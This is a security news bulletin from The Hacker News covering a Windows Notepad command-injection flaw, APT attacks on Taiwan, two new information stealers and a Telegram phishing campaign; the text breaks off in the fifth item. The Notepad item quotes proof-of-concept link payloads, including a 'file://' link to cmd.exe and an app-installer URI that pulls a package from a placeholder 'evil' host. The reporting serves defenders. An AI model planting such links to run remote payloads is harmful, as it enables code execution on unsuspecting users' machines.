---
title: ThreatsDay Bulletin: AI Prompt RCE, Claude 0-Click, RenEngine Loader, Auto 0-Days & 25+ Stories
url: https://thehackernews.com/2026/02/threatsday-bulletin-ai-prompt-rce.html
source: The Hacker News
date: 2026-02-12
fetch_date: 2026-02-13T04:18:42.095990
---

# ThreatsDay Bulletin: AI Prompt RCE, Claude 0-Click, RenEngine Loader, Auto 0-Days & 25+ Stories

#1 Trusted Cybersecurity News Platform

Followed by 5.20+ million[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.facebook.com/thehackernews)

[![The Hacker News Logo](data:image/png;base64...)](/)

**

**

[** Subscribe – Get Latest News](#email-outer)

* [** Home](/)
* [** Newsletter](#email-outer)
* [** Webinars](/p/upcoming-hacker-news-webinars.html)

* [Home](/)
* [Threat Intelligence](/search/label/Threat%20Intelligence)
* [Vulnerabilities](/search/label/Vulnerability)
* [Cyber Attacks](/search/label/Cyber%20Attack)
* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Expert Insights](https://thehackernews.com/expert-insights/)
* [Awards](https://awards.thehackernews.com/)

**

**

**

Resources

* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Awards](https://awards.thehackernews.com/)
* [Free eBooks](https://thehackernews.tradepub.com)

About Site

* [About THN](/p/about-us.html)
* [Jobs](/p/careers-technical-writer-designer-and.html)
* [Advertise with us](/p/advertising-with-hacker-news.html)

Contact/Tip Us

[**

Reach out to get featured—contact us to send your exclusive story idea, research, hacks, or ask us a question or leave a comment/feedback!](/p/submit-news.html)

Follow Us On Social Media

[**](https://www.facebook.com/thehackernews)
[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.youtube.com/c/thehackernews?sub_confirmation=1)
[**](https://www.instagram.com/thehackernews/)

[** RSS Feeds](https://feeds.feedburner.com/TheHackersNews)
[** Email Alerts](#email-outer)

[![Security Service Edge](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5Ij_-TeqFMEsRFzgRRFzSRlVK6oHCncN_eJ2fkOdsA_1tN9HQbAlEEife2Z2JUt1lPv4st5n9KZP84jGEYY9Up6BQ7QE-N5rs6OhzL5thxGzVxnMx3JH9cGRLi9S5Kl-iV5PgjBeTdkBLnv_inF8UUAo88iqdmgJuPIc_6qiPyUMXwFyZWbZvkZkcRXSw/s728-e100/gartner-d.jpg)](https://thehackernews.uk/sse-awards-insight-d)

# [ThreatsDay Bulletin: AI Prompt RCE, Claude 0-Click, RenEngine Loader, Auto 0-Days & 25+ Stories](https://thehackernews.com/2026/02/threatsday-bulletin-ai-prompt-rce.html)

**Ravie Lakshmanan**Feb 12, 2026Cybersecurity / Hacking News

[![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4Nc_7NCkh6b_GnhFP3euTAuace33F0nRMsZfDoe-xx5pN0Wm5kDPdUQhqxqfMIs_Y7MgXIBUAqAeRIk8lwfY8CsOqC27RxU9MH03DMNRpt56mJGU_okNrnEwdqFkaApUrObEBFmDnCHQXXJe_VdkUMbMXsa356WODvfsU4FPvciKR2CcIpNAHsrWGSe0a/s1700-e365/threatsday-main-1.jpg)

Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.

Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise activity is becoming more deliberate, structured, and persistent. The objective is less about disruption and more about staying embedded long enough to extract value.

There’s also growing overlap between cybercrime, espionage tradecraft, and opportunistic intrusion. Techniques are bleeding across groups, making attribution harder and defense baselines less reliable.

Below is this week’s ThreatsDay Bulletin — a tight scan of the signals that matter, distilled into quick reads. Each item adds context to where threat pressure is building next.

1. Notepad RCE via Markdown Links

   [Microsoft Patches Notepad Flaw](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-20841)

   Microsoft has patched a command injection flaw ([CVE-2026-20841](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-20841), CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits [show](https://github.com/BTtea/CVE-2026-20841-PoC) that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly [Patch Tuesday update](https://thehackernews.com/2026/02/microsoft-patches-59-vulnerabilities.html) this week. Microsoft added Markdown support to Notepad on Windows 11 last May.
2. APT Pressure Intensifies on Taiwan

   [Taiwan Becomes Target of APT Attacks](https://teamt5.org/en/posts/apt-threat-landscape-in-apac-2025-industrialization-of-intrusions/)

   TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor [said](https://teamt5.org/en/posts/apt-threat-landscape-in-apac-2025-industrialization-of-intrusions/). "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."
3. Node.js Stealer Hits Windows

   [LTX Stealer Targets Windows Systems](https://www.cyfirma.com/research/ltx-stealer-analysis-of-a-node-js-based-credential-stealer/)

   A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA [said](https://www.cyfirma.com/research/ltx-stealer-analysis-of-a-node-js-based-credential-stealer/).
4. Marco Stealer Expands Data Theft

   [Marco Stealer Emerges in the Wild](https://www.zscaler.com/blogs/security-research/technical-analysis-marco-stealer)

   Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz [said](https://www.zscaler.com/blogs/security-research/technical-analysis-marco-stealer). "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."
5. Telegram Sessions Hijacked via OAuth Abuse

   [Social Engineering Campaign Targets Telegram Accounts](https://www.cyfirma.com/research/re-emerging-telegram-phishing-campaign-targeting-user-authorization-prompts/)

   A new account takeover campaign has been observed abusing Telegram's native authentication workflows t...